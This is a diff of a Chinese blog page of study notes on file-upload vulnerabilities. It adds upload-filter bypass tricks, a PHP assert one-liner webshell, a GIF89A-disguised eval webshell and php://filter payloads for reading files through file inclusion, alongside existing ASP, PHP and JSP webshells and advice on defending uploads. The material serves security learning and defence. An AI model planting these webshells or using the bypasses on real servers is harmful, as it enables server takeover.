@@ -8,7 +8,7 @@
   
   
   
-  <title>文件上传漏洞 | JohnScott2046的博客</title>
+  <title>30文件上传漏洞 | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,12 +254,12 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>文件上传漏洞</span>
+    <span>30文件上传漏洞</span>
   </h1>
   <div class="article-top-meta">
     <span>
       发布 : 
-      2021-08-26
+      2021-09-01
     </span>
     
       <span>
@@ -282,17 +282,21 @@
     <div class="markdown-body">
       <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>某些有上传文件功能的网站，主要以上传图片、账号头像等，说明网站存在文件上传点</p>
 <p>文件上传漏洞的原因是由于对用户上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马文件并获取得服务的权限</p>
+<h3 id="常見的上傳检验规则"><a href="#常見的上傳检验规则" class="headerlink" title="常見的上傳检验规则"></a>常見的上傳检验规则</h3><p>服务端mime类型检测(检测Content-Type)</p>
+<p>客户端js检测(检测文件扩展名，只允许图片-抓包进行修改)</p>
+<p>服务端目录路径检测(检测path相关的内容)</p>
+<p>服务端文件名扩展名检测(文件扩展名相关的、黑名单匹配允许的文件名)<br>-文件名大小写 asP  pHp<br>-黑名单 php3 php2 php5 phtml asp aspx ascx ashx cer asa jsp jspx<br>-特殊文件名绕过 test.php.   test.php_  <code>_</code>为空格<br>windows里面是不允许<code>_</code>的，所以上传后自动替换掉，linux没有<br>-0x00截断<br>-图片马<br>-二次渲染<br>服务端文件内容检测(内容是否合法、恶意代码)</p>
 <h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>木马 伪装成正常程序的恶意软件，运行可以获取计算机的一些权限<br>shell 是一个命令行交互工具<br>webshell 拥有网站服务器的权限shell，例如文件木马，具有管理网站或者服务器的功能，这个文件就是webshell<br>webshell管理工具  菜刀 蚁剑 冰鞋，配合webshell使用</p>
 <p>文件木马：<br>一句话：精简<br>小马：代码量小 功能小 ，很多都有上传的功能，来上传大马<br>大马：代码多，功能全面</p>
 <p>网站解析<br>浏览器输入域名<br>浏览器通过系统向dns服务器查询域名对应的ip<br>浏览器向ip服务器发送http请求<br>服务器分析用户请求，做出响应<br>浏览器接收响应，显示出相应的页面</p>
 <p>网站存在上传点<br>上传的文件，可以被执行，有可见链接</p>
-<h3 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h3><p>对于不同的语言有不同的构造方法</p>
+<h3 id="普通的一句话"><a href="#普通的一句话" class="headerlink" title="普通的一句话"></a>普通的一句话</h3><p>对于不同的语言有不同的构造方法</p>
 <p>基本构造：最开头构造的是脚本开始的标记<br>核心部分：获取并执行得到的内容，通常类似 eval、execute等<br>被执行内容：一般是 http 等协议接受的值，通常类似 <code>request</code>、 <code>$_POST</code>等</p>
 <p>asp 一句话木马：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(&quot;value&quot;))%&gt;</span><br></pre></td></tr></table></figure>
 
 <p>php 一句话木马：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[value]);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;value&#39;]);?&gt;</span><br><span class="line">&lt;?php assert($_POST[&#39;value&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>jsp 一句话木马：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br></pre></td></tr></table></figure>
@@ -311,8 +315,14 @@
 <p>4.<br>用PS打开图片<br>文件→文件简介<br>插入你需要的木马代码<br>文件→保存</p>
 <p>5.<br>在kali上使用mimetype来制作<br>mimetype shell.jpg<br>shell.jpg: application/x-php</p>
 <p>cat shell.php &gt;&gt; 1.jpg<br>vim 1.jpg</p>
+<ol start="6">
+<li>给一句话前面加GIF89A字符<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89A</span><br><span class="line">&lt;?php @eval($_POST[2046]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
 <p>getimagesize 这个函数是检查图片前面16进制是否为图片<br>如果在16进制后面加入恶意代码，就可以上传图片和本地文件包含漏洞（改 URL 的）结合达到入侵的目的</p>
 <p>拓展：如果php版本低于5.4可以使用 webshell.php%00.jpg进行截断绕过，这样文件会被直接当做php文件进行执行，大于5.4的需要使用文件包含进行绕过</p>
+<h3 id="phtml"><a href="#phtml" class="headerlink" title="phtml"></a>phtml</h3><p>phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析</p>
 <h3 id="防御文件上传"><a href="#防御文件上传" class="headerlink" title="防御文件上传"></a>防御文件上传</h3><h4 id="系统运行时的防御"><a href="#系统运行时的防御" class="headerlink" title="系统运行时的防御"></a>系统运行时的防御</h4><ol>
 <li><p>文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响</p>
 </li>
@@ -329,6 +339,9 @@
 <h4 id="系统维护阶段的防御"><a href="#系统维护阶段的防御" class="headerlink" title="系统维护阶段的防御"></a>系统维护阶段的防御</h4><p>1.使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复</p>
 <p>2.定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补</p>
 <p>3.对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自身的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器</p>
+<p>?file=php://filter/convert.base64-encode/resource=flag.php<br>这样即可读到flag.php文件base64加密过后的内容</p>
+<p>?file=php://filter/read=convert.base64-encode/resource=flag.php<br>这一种是指定读链的筛选列表</p>
     </div>
   </div>
   
@@ -431,13 +444,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/29%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" target="_self">暴力破解</a>
+        <a href="/2021/29%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" target="_self">29暴力破解</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/31%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_self">命令执行漏洞</a>
+        <a href="/2021/31%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_self">31命令执行漏洞</a>
         <i class="iconfont icon-next"></i>
       </div>
     
